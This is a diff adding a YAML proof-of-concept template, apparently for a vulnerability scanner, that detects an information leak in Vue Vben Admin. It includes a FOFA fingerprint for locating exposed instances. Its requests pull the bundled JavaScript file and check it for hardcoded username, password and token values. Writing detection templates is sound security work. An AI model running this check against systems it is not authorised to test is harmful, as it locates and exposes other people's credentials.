@@ -1,0 +1,22 @@
+id: poc-yaml-vue-vben-admin-info-leak
+info:
+  name: Vue Vben Admin 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: vue-vben-admin
+  fofa: icon_hash="-317536629"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"/assets/index")
+  output:
+  - regex_match(body,"/assets/index(?P<api>.*?).js")
+- method: GET
+  path: /assets/index{{.api}}.js
+  headers:
+    Range: bytes=1100000-1280000
+  expression: status_code == 206 && matches(body,"username:\".*?\"")  && matches(body,"password:\".*?\"")  &&
+    matches(body,"token:\".*?\"")
+variables: {}
+transport: http
